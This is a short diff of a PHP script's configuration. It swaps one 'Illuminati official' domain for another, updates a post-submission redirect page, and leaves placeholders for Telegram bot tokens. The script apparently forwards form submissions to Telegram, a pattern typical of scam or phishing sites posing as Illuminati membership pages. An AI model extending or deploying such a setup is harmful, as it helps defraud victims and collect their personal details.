@@ -7,7 +7,7 @@ ob_start(); // Start output buffering
 // --- Configuration ---
 // NOTE: $site_map must be populated for the script to function
 $site_map = [
-    "illuminatiofficial.world" => [
+    "illuminatinetwork.world" => [
         "bots" => [
             // Add your Telegram bot tokens and chat IDs here
             "bots" => [
@@ -16,7 +16,7 @@ $site_map = [
         ],
             // Add more bots if needed
         ],
-        "redirect" => "https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html" 
+        "redirect" => "https://illuminatinetwork.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html" 
     ],
     
     "localhost" => [
